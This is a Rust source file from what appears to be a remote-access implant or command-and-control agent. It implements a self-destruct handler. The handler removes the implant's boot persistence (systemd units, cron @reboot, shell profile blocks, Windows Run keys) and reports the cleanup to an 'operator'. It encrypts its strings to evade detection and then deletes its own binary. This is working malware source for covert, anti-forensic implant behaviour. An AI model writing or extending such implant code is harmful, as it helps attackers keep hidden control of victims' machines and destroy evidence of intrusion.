// src/agent/handlers/lifecycle.rs - Agent lifecycle (self-destruct, exit)

use crate::common::CommandResponse;
use crate::utils;
use crate::strcrypt_rt;
use strcrypt::aes_str;
use super::{HandlerContext, DispatchResult, AgentAction};

pub(crate) async fn handle_self_destruct(ctx: &HandlerContext, req_id: u64) -> DispatchResult {
    // Remove persistence FIRST so the agent cannot resurrect at boot
    // (systemd Restart unit, cron @reboot, profile block, Run key, ...),
    // and return the per-method cleanup report so the operator sees
    // exactly what was removed before the binary deletes itself.
    let report = crate::agent::persistence::cleanup_all();
    let resp = CommandResponse {
        request_id: req_id,
        output: format!("{}\n{}", aes_str!("Self-destruct..."), report),
        error: String::new(),
        exit_code: 0,
    };
    if let Ok(data) = serde_json::to_vec(&resp) {
        let _ = ctx.tx.send(data).await;
    }
    tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
    utils::self_destruct();
    // self_destruct exits the process; this is unreachable but satisfies the type
    #[allow(unreachable_code)]
    DispatchResult::AlreadySent(AgentAction::None)
}